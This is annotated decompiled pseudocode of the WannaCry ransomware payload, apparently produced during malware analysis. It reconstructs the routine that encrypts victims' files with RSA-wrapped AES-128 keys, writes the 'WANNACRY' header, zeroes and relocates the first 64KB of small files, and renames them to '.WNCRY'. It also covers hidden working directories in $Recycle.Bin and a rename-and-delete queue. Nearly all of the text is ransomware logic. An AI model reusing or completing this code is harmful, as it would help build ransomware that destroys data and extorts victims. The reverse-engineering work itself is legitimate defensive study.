// payload.dll batch 4 — FILE ENCRYPTION core (sub_10001BB0), rename queue, dir walk

// ===== 0x10001bb0 sub_10001BB0 — ENCRYPT ONE FILE =====
// a4 = mode: 3 = whole-file rw, 4 = large-file (seal first 64KB) ; other = append-style
// Format = destination path (already renamed, e.g. "%s.%d.WNCRY")
BOOL __thiscall sub_10001BB0(int this, LPCWSTR lpFileName, wchar_t *Format, unsigned int a4) {
  // open
  v5 = (a4==3) ? 0xC0000000 : 0x80000000;   // GENERIC_READ|WRITE or READ
  FileW = CreateFileW(lpFileName, v5, FILE_SHARE_READ|WRITE, 0, OPEN_EXISTING, 0, 0);
  if ( FileW == INVALID ) { if (sub_10003250(lpFileName)==0) fail; retry once }
  GetFileSizeEx(FileW,&FileSize); GetFileTime(...);
  // ALREADY-ENCRYPTED CHECK: "WANNACRY"+256+... and v21>=a4 -> skip
  if ( ReadFile(FileW,&Buffer,8)==8 && memcmp(&Buffer,"WANNACRY",8)==0
    && ReadFile(4,&nNumberOfBytesToRead) && nNumberOfBytesToRead==256
    && ReadFile v16 0x100 && ReadFile(&v21,4) && v21>=a4 ) return true;   // already done
  SetFilePointer(FileW,0,nullptr,FILE_BEGIN);
  if ( a4 == 4 ) {
    // large-file mode: separate output file "%s.t" (aT)
    swprintf(FileName, aSS, Format, aT);
    v9 = CreateFileW(FileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
    if ( v9==INVALID ) v9 = CreateFileW(FileName, GENERIC_WRITE, FILE_SHARE_READ|WRITE, ...);
    if ( v21 == 3 ) FileSize.QuadPart -= 0x10000LL;
  } else {
    // small-file mode: read first 64KB, append to end, zero first 64KB (fast destroy)
    ReadFile(v8, buf1M, 0x10000); SetFilePointer(v8,0,0,FILE_END);
    WriteFile(v8, buf1M, 0x10000);  memset(buf1M,0,0x10000);
    SetFilePointer(v8,0,0,FILE_BEGIN); WriteFile(v8, buf1M, 0x10000);  // zeroes head
    SetFilePointer(v8,0,0,FILE_BEGIN); v9 = v8;
  }
  // probabilistic junk-append flag
  if ( a4==4 && FileSize<0xC800000 && *(this+2312)!=0 && rand()% *(this+2312)==0 )
    if (*(this+2320) < *(this+2316)) { v31 = 1; *(this+2320)+=1; }
  // generate random 16-byte AES key, RSA-encrypt it -> pbData (512)
  nNumberOfBytesToWrite = 512;
  if ( sub_10004590(pbBuffer, 0x10u, pbData, &nNumberOfBytesToWrite) == 0 ) fail;
  sub_10006270(pbBuffer, off_1000EEFC, 16, 16);   // AES-128 key expansion
  memset(pbBuffer, 0, 16);
  // write header
  WriteFile(v9, "WANNACRY", 8);
  WriteFile(v9, &nNumberOfBytesToWrite, 4);       // 512
  WriteFile(v9, pbData, nNumberOfBytesToWrite);   // 512-byte RSA-encrypted AES key
  WriteFile(v9, &a4, 4);                          // mode
  WriteFile(v9, &FileSize, 8);                    // original size
  if ( a4 == 4 ) {
    v34 = FileSize;
    if ( v21 == 3 ) {  // resume: last 64KB already encrypted
      SetFilePointer(v8, -0x10000, 0, FILE_END); ReadFile(v8, buf1M, 0x10000);
      sub_10006DF0(buf1M, buf2M, 0x10000, 1);     // AES-encrypt 64KB
      WriteFile(v9, buf2M, 0x10000); SetFilePointer(v8, 0x10000, 0, FILE_BEGIN); v34 -= 0x10000;
    }
    // main loop: 1MB chunks, AES-encrypt each (padded to 16)
    while ( v34.QuadPart > 0 ) {
      if ( !stopflag && ReadFile(hFile, buf1M, 0x100000, &read) && read ) {
        v34 -= read;
        v12 = 16*(((read-1)>>4)+1);              // round up to 16
        if (v12>read) memset(buf1M+read,0,v12-read);
        sub_10006DF0(buf1M, buf2M, v12, 1);      // AES CBC encrypt
        WriteFile(hObject, buf2M, v12);
      }
    }
  }
  SetFileTime(v9, &CreationTime, &LastAccessTime, &LastWriteTime);
  if ( a4 == 4 ) {
    CloseHandle(v8); CloseHandle(v9);
    v13 = MoveFileW(FileName, Format);           // rename .t -> final
    if ( v13 ) SetFileAttributesW(Format, FILE_ATTRIBUTE_NORMAL);
    else DeleteFileW(FileName);
  } else {
    CloseHandle(v8); CloseHandle(v9);
    v13 = MoveFileW(lpFileName, Format);
  }
  if ( v13 ) { v14 = *(this+1236); if (v14) v14(lpFileName, Format, FileSize.HighPart, FileSize.LowPart, a4, v31); }  // progress cb
  return v13;
}

// ===== 0x10001980 sub_10001980 — encrypt-context teardown =====
int __thiscall sub_10001980(int this) {
  sub_10003DE0(this+4); sub_10003DE0(this+44);
  zero+GlobalFree(this+1224, 1MB); zero+GlobalFree(this+1228, 1MB);
  if (this+1240) { *(this+1252)=1; WaitForSingleObject(...); CloseHandle; }
  CloseHandle(this+1244); CloseHandle(this+1248);
  DeleteFileW(this+1788);   // delete leftover temp
}

// ===== 0x10001b40 sub_10001B40 — set thread/sleep params =====
int __thiscall sub_10001B40(_DWORD *this, int a2, int a3) { *(this+579)=a2; *(this+578)=a3; return a2; }

// ===== 0x10005020 sub_10005020 — pick working dir for a drive (temp/ or $Recycle.Bin) =====
LPWSTR __cdecl sub_10005020(int a1, LPWSTR lpBuffer) {
  GetWindowsDirectoryW(lpBuffer, 0x104);
  if ( *lpBuffer == a1+65 ) {  // system drive -> %TEMP%
    GetTempPathW(0x104, lpBuffer); strip trailing '\';
  } else {
    swprintf(lpBuffer, aCRecycler, a1+65);   // "%c:\\$Recycle.Bin"
    CreateDirectoryW(...); SetFileAttributesW(... | HIDDEN);
  }
}

// ===== 0x100050b0 sub_100050B0 — junk filename =====
wchar_t *__cdecl sub_100050B0(int a1, wchar_t *Buffer) {
  sub_10005020(a1, Format);
  swprintf(Buffer, aSHibsysS, Format, aWcryt);   // "%s\\%s" + ... j.hbi/sys style name
  DeleteFileW(Buffer);
}

// ===== 0x10001b60 sub_10001B60 — set root dir + counter for WNCRY names =====
int __thiscall sub_10001B60(wchar_t *this, wchar_t *Source) {
  wcscpy(this+634, Source);  *((_DWORD*)this+577)+=1;
  swprintf(this+894, aSDS, this+634, v4, aWcryt);   // "%s.%d.WNCRY"
}

// ===== 0x10002c20 sub_10002C20 (StartAddress thread) — file rename/cleanup queue =====
// waits on event (this+1244); for each queued file: MoveFileExW to unique "%s.%d.WNCRY" name (up to 20 tries)
// if target exists -> mark hidden, MoveFileExW(,DELAY_UNTIL_REBOOT); on failure after 20 tries -> delete w/ hidden flag
void __thiscall sub_10002C20(int this) { ... }
// ===== 0x10002c19 =====
int __stdcall sub_10002C19(int a1) { return 0; }
// ===== 0x10002c10 StartAddress =====
void __stdcall StartAddress(LPVOID p) { sub_10002C20((int)p); }

// ===== 0x10002e00 sub_10002E00 — enqueue file for rename (flush when queue>5) =====
DWORD __thiscall sub_10002E00(int this, wchar_t *String) {
  if (String==nullptr) goto flush;
  if (wcslen(this+1788)==0) sub_10003260(String, this+4);   // build target name
  append std::wstring copy to list (this+1260); ++ *(this+1264);
  if ( *(this+1264) > 5 ) { flush: ResetEvent(this+1248); SetEvent(this+1244); WaitForSingleObject(this+1248, INFINITE); }
  if (String==nullptr) { v=wcslen(this+1788); if(v) DeleteFileW(v); }
}
